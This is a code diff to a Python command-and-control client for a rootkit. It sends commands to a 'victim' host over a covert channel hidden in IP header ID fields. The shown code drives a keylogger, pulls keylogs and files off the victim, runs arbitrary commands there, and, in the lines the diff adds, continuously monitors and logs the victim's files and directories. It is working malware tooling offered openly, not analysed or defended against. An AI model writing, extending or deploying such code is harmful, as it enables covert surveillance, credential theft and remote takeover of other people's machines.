@@ -3,6 +3,8 @@ import platform
 import socket
 import struct
 import time
+import json
+from datetime import datetime
 
 # Commander configuration
 VICTIM_IP = "192.168.1.124"  # Target victim IP address (change as appropriate)
@@ -12,6 +14,7 @@ COVERT_UDP_PORT = 40000  # The UDP port on a victim used for a covert channel
 # Timeouts
 RECV_TIMEOUT = 5.0  # seconds to wait for a response from a victim
 
+
 def get_local_ip(dest_ip, dest_port):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # 用 Victim 的 UDP 端口（这里用 COVERT_UDP_PORT）来探路
@@ -19,7 +22,6 @@ def get_local_ip(dest_ip, dest_port):
     local_ip = s.getsockname()[0]
     s.close()
     return local_ip
-
 
 
 class Commander:
@@ -79,7 +81,7 @@ class Commander:
             message += b'\x00'
         # Send each 2-byte chunk in the IP I D field
         for i in range(0, len(message), 2):
-            chunk = message[i:i+2]
+            chunk = message[i:i + 2]
             # Convert chunk to 16-bit integer
             if len(chunk) < 2:
                 # should not happen due to padding
@@ -94,7 +96,7 @@ class Commander:
             flags_frag = 0  # no fragmentation
             ttl = 64
             proto = socket.IPPROTO_UDP
-            #src_ip = socket.gethostbyname(socket.gethostname())  # attacker local IP
+            # src_ip = socket.gethostbyname(socket.gethostname())  # attacker local IP
             src_ip = get_local_ip(VICTIM_IP, COVERT_UDP_PORT)
 
             dst_ip = VICTIM_IP
@@ -102,14 +104,14 @@ class Commander:
             dst_addr = socket.inet_aton(dst_ip)
             # IP header pack (without checksum for now)
             ip_header = struct.pack(">BBHHHBBH4s4s",
-                                     ver_ihl, tos, total_len, identification,
-                                     flags_frag, ttl, proto, 0, src_addr, dst_addr)
+                                    ver_ihl, tos, total_len, identification,
+                                    flags_frag, ttl, proto, 0, src_addr, dst_addr)
             # Calculate IP header checksum
             chksum = self.calc_checksum(ip_header)
             # Re-pack with checksum
             ip_header = struct.pack(">BBHHHBBH4s4s",
-                                     ver_ihl, tos, total_len, identification,
-                                     flags_frag, ttl, proto, chksum, src_addr, dst_addr)
+                                    ver_ihl, tos, total_len, identification,
+                                    flags_frag, ttl, proto, chksum, src_addr, dst_addr)
             # UDP header (8 bytes)
             src_port = 55555  # arbitrary source port
             dst_port = COVERT_UDP_PORT
@@ -181,8 +183,8 @@ class Commander:
         # Sum all 16-bit words
         for i in range(0, len(msg), 2):
             w = msg[i] << 8
-            if i+1 < len(msg):
-                w += msg[i+1]
+            if i + 1 < len(msg):
+                w += msg[i + 1]
             s += w
         # Add carry bits
         s = (s & 0xFFFF) + (s >> 16)
@@ -200,6 +202,7 @@ class Commander:
         self.connected = False
         print("[*] Disconnected from victim.")
 
+
 # High-level command functions using the Commander class
 def cmd_uninstall(comm: Commander):
     print("[*] Instructing victim to uninstall rootkit...")
@@ -209,6 +212,7 @@ def cmd_uninstall(comm: Commander):
         print("[Victim]:", resp.decode(errors='ignore'))
     comm.disconnect()
 
+
 def cmd_start_keylogger(comm: Commander):
     print("[*] Instructing victim to start keylogger...")
     comm.send_covert_message(b"CMD_KEYLOG_START")
@@ -216,12 +220,14 @@ def cmd_start_keylogger(comm: Commander):
     if resp:
         print("[Victim]:", resp.decode())
 
+
 def cmd_stop_keylogger(comm: Commander):
     print("[*] Instructing victim to stop keylogger...")
     comm.send_covert_message(b"CMD_KEYLOG_STOP")
     resp = comm.recv_covert_message()
     if resp:
         print("[Victim]:", resp.decode())
+
 
 def cmd_get_keylog(comm: Commander):
     print("[*] Requesting keylog data from victim...")
@@ -236,6 +242,7 @@ def cmd_get_keylog(comm: Commander):
         print("[*] Keylog saved. Contents:\n" + data)
     else:
         print("[!] No response or empty keylog.")
+
 
 def cmd_put_file(comm: Commander):
     local_path = input("Enter local file path to send: ").strip()
@@ -259,6 +266,7 @@ def cmd_put_file(comm: Commander):
         print("[Victim]:", resp.decode())
     else:
         print("[!] No response, file transfer may have failed.")
+
 
 def cmd_get_file(comm: Commander):
     remote_path = input("Enter file path on victim to download: ").strip()
@@ -284,29 +292,72 @@ def cmd_get_file(comm: Commander):
         except Exception as e:
             print("[!] Failed to save file:", e)
 
+
 def cmd_monitor_file(comm: Commander):
     file_path = input("Enter file path on victim to monitor: ").strip()
-    cmd = f"CMD_MON_FILE:{file_path}".encode()
-    print(f"[*] Instructing victim to monitor file: {file_path}")
-    comm.send_covert_message(cmd)
-    resp = comm.recv_covert_message()
-    if resp:
-        print("[Victim]:", resp.decode())
-    else:
-        print("[*] Monitor command sent. No immediate response.")
-    # In this implementation, a victim logs events internally.
-    # User can later fetch the log if needed via normal file download.
+    date_str = datetime.now().strftime("%Y-%m-%d")
+    log_filename = f"{date_str}.log"
+    print(f"[*] 开始监控文件：{file_path}。日志保存为 {log_filename}，按 Ctrl+C 停止。")
+    comm.send_covert_message(f"CMD_MON_FILE:{file_path}".encode())
+
+    with open(log_filename, "a", encoding="utf-8") as logfile:
+        try:
+            while True:
+                data = comm.recv_covert_message()
+                if not data:
+                    continue
+                try:
+                    msg = json.loads(data.decode(errors="ignore"))
+                except json.JSONDecodeError:
+                    continue
+
+                print(f"[{msg['timestamp']}] 文件更改: {msg['path']}")
+                if 'content' in msg:
+                    print(msg['content'])
+                print("-" * 40)
+
+                logfile.write(json.dumps(msg, ensure_ascii=False) + "\n")
+                logfile.flush()
+        except KeyboardInterrupt:
+            print("\n[*] 停止文件监控。")
+            comm.send_covert_message(b"CMD_STOP_MON_FILE")
+
 
 def cmd_monitor_dir(comm: Commander):
     dir_path = input("Enter directory path on victim to monitor: ").strip()
-    cmd = f"CMD_MON_DIR:{dir_path}".encode()
-    print(f"[*] Instructing victim to monitor directory: {dir_path}")
-    comm.send_covert_message(cmd)
-    resp = comm.recv_covert_message()
-    if resp:
-        print("[Victim]:", resp.decode())
-    else:
-        print("[*] Monitor command sent. No immediate response.")
+    date_str = datetime.now().strftime("%Y-%m-%d")
+    log_filename = f"{date_str}.log"
+    print(f"[*] 开始监控目录：{dir_path}。日志保存为 {log_filename}，按 Ctrl+C 停止。")
+    comm.send_covert_message(f"CMD_MON_DIR:{dir_path}".encode())
+
+    with open(log_filename, "a", encoding="utf-8") as logfile:
+        try:
+            while True:
+                data = comm.recv_covert_message()
+                if not data:
+                    continue  # 超时重试
+                try:
+                    msg = json.loads(data.decode(errors="ignore"))
+                except json.JSONDecodeError:
+                    # 如果解析失败，忽略
+                    continue
+
+                # 打印关键信息
+                print(
+                    f"[{msg['timestamp']}] 事件类型: {msg['type']} | 文件: {msg.get('filename', '')} | 路径: {msg['path']}")
+                # 如果有 content 字段，就打印
+                if 'content' in msg:
+                    print(msg['content'])
+                print("-" * 40)
+
+                # 追加写入日志
+                logfile.write(json.dumps(msg, ensure_ascii=False) + "\n")
+                logfile.flush()
+
+        except KeyboardInterrupt:
+            print("\n[*] 停止目录监控。")
+            comm.send_covert_message(b"CMD_STOP_MON_DIR")
+
 
 def cmd_run_program(comm: Commander):
     prog = input("Enter command to run on victim: ").strip()
@@ -324,6 +375,7 @@ def cmd_run_program(comm: Commander):
         print(output)
         print("----------[ End ]----------")
 
+
 def cmd_fetch_events(comm: Commander):
     print("Get Minitor events from victim...")
     comm.send_covert_message(b"CMD_FETCH_EVENTS")
@@ -334,7 +386,9 @@ def cmd_fetch_events(comm: Commander):
     else:
         print("No events found or timeout")
 
+
 comm = None
+
 
 def main():
     comm = Commander()
@@ -410,6 +464,7 @@ def main():
                 break
             else:
                 continue
+
 
 if __name__ == "__main__":
     try:
